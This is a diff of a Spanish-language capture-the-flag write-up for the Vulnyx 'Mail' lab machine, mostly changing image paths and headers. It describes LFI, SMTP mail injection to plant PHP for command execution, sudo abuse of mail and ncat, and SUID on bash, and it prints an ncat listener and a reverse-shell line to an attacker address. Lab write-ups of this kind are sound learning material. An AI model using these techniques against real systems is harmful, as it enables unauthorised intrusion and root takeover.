@@ -4,13 +4,13 @@ title:  "Mail - Vulnyx"
 date:   2025-08-14
 categories: [Vulnyx]
 tags: [Vulnyx, PHP, LFI, SMTP, Mail Injection, Command Injection]
-image: "../assets/machines/Vulnyx_Mail/vulnyx.png"
+image: "../assets/machines/VULNYX/Vulnyx_Mail/vulnyx.png"
 ---
 Esta maquina pertenece a Vulnyx, es de dificultad media y tiene uno que otro concepto interesante de vulnerabilidades programadas en PHP.
 
-![](/assets/machines/Vulnyx_Mail/info.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/info.png)
 
-# Fase de reconocimiento:
+# Fase de reconocimiento
 Bueno, esta maquina la estamos corriendo en **LOCAL**, si deseamos encontrar maquinas en toda nuestra red local, podemos emplear el comando:
 {% highlight bash %}
 sudo arp-scan -l
@@ -26,18 +26,18 @@ Obteniendo como resultado los siguientes puertos abiertos:
 
 - `80` de un servicio WEB.
 
-![](/assets/machines/Vulnyx_Mail/1.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/1.png)
 
 Si analizamos la web, encontraremos lo siguiente:
 
-![](/assets/machines/Vulnyx_Mail/2.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/2.png)
 
 Si interactuamos con el **BOTON** "search", se nos hara redireccion a una funcion en <span class="color-text-blue">**PHP**</span>.
-![](/assets/machines/Vulnyx_Mail/3.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/3.png)
 Si vamos buscando por distintos valores, vamos a encontrar correos de 2 usuarios: `abel` y `cain`. Ambos hablan sobre perdida de credenciales.
-
+## LFI
 Lo que nos importa es buscar si podemos hacer un cambio en el parametro que le pasamos a la funcion, para por ejemplo ver si podemos ejecutar comandos o listar directorios.
-![](/assets/machines/Vulnyx_Mail/4.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/4.png)
 Como podemos ver, si apuntamos al `/etc/passwd`, tenemos un <span class="color-text-blue">**LFI**</span>(Local File Inclusion). Por lo que podemos intentar muchos vectores de ataque.
 
 Si bien vimos que tenemos el puerto 25 del **TELNET**, podemos aprovecharnos de que podemos leer estos correos y extraer informacion como:
@@ -45,7 +45,7 @@ Si bien vimos que tenemos el puerto 25 del **TELNET**, podemos aprovecharnos de 
 -`mail.nyx`
 
 -`abel@mail.nyx` y `cain@mail.nyx`
-
+## MAIL INJECTION
 Si hacemos una busqueda rapida en internet, veremos que existen distintas instrucciones para lograr enviar un correo, y podemos usar la interpretacion de PHP por lado del servidor para ejecutar comandos, la estructura para lograr esto seria
 {% highlight go %}
 telnet <IP> 25
@@ -70,25 +70,27 @@ QUIT
 Connection closed by foreign host.
 {% endhighlight %}
 
-![](/assets/machines/Vulnyx_Mail/5.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/5.png)
 
 Si nos ha salido todo conforme, nos quedara apuntar a la ruta del que recibe el mensaje, en este caso `abel` -> `/var/mail/abel`
 
-![](/assets/machines/Vulnyx_Mail/6.png)
-
+![](/assets/machines/VULNYX/Vulnyx_Mail/6.png)
+### USER CAIN
 Y como podemos ver, tenemos <span class="color-text-orange">**ejecucion remota de comandos**</span>.
 
 Por lo que nos queda ganar acceso a la maquina, usaremos **URL-ENCODE**.
-![](/assets/machines/Vulnyx_Mail/7.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/7.png)
 Y como podemos ver, ya hemos ganado acceso al usuario `cain`, por los que nos toca pivotar al usuario `abel`.
-![](/assets/machines/Vulnyx_Mail/8.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/8.png)
 Y vemos que podemos ejecutar como el usuario `abel`, el comando mail, y podremos aprovechar la funcion exec que tiene indicado en su documentacion.
-![](/assets/machines/Vulnyx_Mail/9.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/9.png)
+### USER ABEL
 Por lo que podemos tratar de summonearnos una bash.
 Y como vemos, tenemos el acceso para el usuario `abel`, este a su vez tiene permisos de ejecutar como usuario `root` la herramienta `/usr/bin/ncat` usando IPv6 y cualquier parametro adicional.
-![](/assets/machines/Vulnyx_Mail/10.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/10.png)
+### USER ROOT
 Si vemos la documentacion que tiene `NCAT`, podemos ver que tambien nos puede ejecutar comandos.
-![](/assets/machines/Vulnyx_Mail/11.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/11.png)
 Por lo que nos queda seguir la siguiente estructura:
 - Necesitaremos obtener nuestra direccion IPv6, esta la encontraremos con el comando `ip a`
 
@@ -97,14 +99,14 @@ Por lo que nos queda seguir la siguiente estructura:
 # Para el listener
 ncat -6 -lvp <PUERTO>
 {% endhighlight %}
-![](/assets/machines/Vulnyx_Mail/12.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/12.png)
 {% highlight python %}
 # Para la shell
 /usr/bin/ncat -6 <IPv6 del Atacante>%<Nombre de la red> -e /bin/bash
 {% endhighlight %}
-![](/assets/machines/Vulnyx_Mail/13.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/13.png)
 En este caso, yo estoy dandole permiso SUID a la bash, para poder ejecutar el privileged.
 
-![](/assets/machines/Vulnyx_Mail/14.png)
+![](/assets/machines/VULNYX/Vulnyx_Mail/14.png)
 
 # FIN
